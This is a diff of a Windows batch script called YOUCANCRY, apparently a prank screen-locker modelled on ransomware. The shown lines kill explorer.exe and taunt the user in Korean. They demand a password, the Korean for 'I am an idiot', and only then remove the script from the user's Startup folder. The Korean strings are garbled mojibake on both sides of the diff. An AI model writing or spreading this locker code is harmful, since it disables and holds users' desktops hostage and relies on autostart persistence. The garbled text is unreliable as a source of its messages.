@@ -9,26 +9,26 @@ taskkill /f /im explorer.exe
 title YOUCANCRY
 cls
 echo YOUCANCRY 1.1.0
-echo ¾È³ç! ³ÊÀÇ ÄÄÇ»ÅÍ´Â ÀÌÁ¦ ³»²¨¶õ´Ù! Èì.. Á¤È®È÷ ¸»ÇÏ¸é ÀÌ YOUCANCRY°¡ ¸»ÀÌÁö!
+echo ì•ˆë…•! ë„ˆì˜ ì»´í“¨í„°ëŠ” ì´ì œ ë‚´êº¼ëž€ë‹¤! í .. ì •í™•ížˆ ë§í•˜ë©´ ì´ YOUCANCRYê°€ ë§ì´ì§€!
 
-echo alt·Î ÇÒ¼öÀÖ´Â ¹º°¡°¡ ÀÖÁö¸¸, ´Ï°¡ Àü¹®ÀûÀÌ¶ó¸é ÀÌ¹Ì ÇØºÃÀ»°Å¶ó°í »ý°¢ÇØ.
-echo ±×·¡µµ ÀÌ ºñ¹Ð¹øÈ£¸¦ ¸ÂÃçº¸´Â°ÍÀ» ÃßÃµÇØ!
-echo ¸¸¾à ´Ï°¡ 5¹ø Æ²¸°´Ù¸é ³»°¡ ¹º°¡¸¦ ¾Ë·ÁÁÙ°Ô!
+echo altë¡œ í• ìˆ˜ìžˆëŠ” ë­”ê°€ê°€ ìžˆì§€ë§Œ, ë‹ˆê°€ ì „ë¬¸ì ì´ë¼ë©´ ì´ë¯¸ í•´ë´¤ì„ê±°ë¼ê³  ìƒê°í•´.
+echo ê·¸ëž˜ë„ ì´ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë§žì¶°ë³´ëŠ”ê²ƒì„ ì¶”ì²œí•´!
+echo ë§Œì•½ ë‹ˆê°€ 5ë²ˆ í‹€ë¦°ë‹¤ë©´ ë‚´ê°€ ë­”ê°€ë¥¼ ì•Œë ¤ì¤„ê²Œ!
 set what=0
 :a
-set /p passwd=ºñ¹Ð¹øÈ£:
-if %passwd%==³ª´Â¸ÛÃ»ÀÌ´Ù goto case2
+set /p passwd=ë¹„ë°€ë²ˆí˜¸:
+if %passwd%==ë‚˜ëŠ”ë©ì²­ì´ë‹¤ goto case2
 
 :case1
 cls
 set /a what=%what%+1
 if %what%==5 goto case3
-echo ´Ù½Ã »ý°¢ÇØºÁ.
+echo ë‹¤ì‹œ ìƒê°í•´ë´.
 goto a
 
 :case2
 cls
-echo ³Ê ¿ÏÀü ¸ÛÃ»ÀÌ±¸³ª!
+echo ë„ˆ ì™„ì „ ë©ì²­ì´êµ¬ë‚˜!
 if exist "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
 del "C:\Users\avika\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\YOUCANCRY.bat" )
 pause
@@ -36,8 +36,8 @@ start C:\windows\explorer.exe
 goto case4
 
 :case3
-echo ¾Ë¾Ò¾î...
-echo ÈùÆ®¸¦ ÁÙ°Ô
+echo ì•Œì•˜ì–´...
+echo ížŒíŠ¸ë¥¼ ì¤„ê²Œ
 start "" https://github.com/firecomputer/YOUCANCRY
 goto a
 
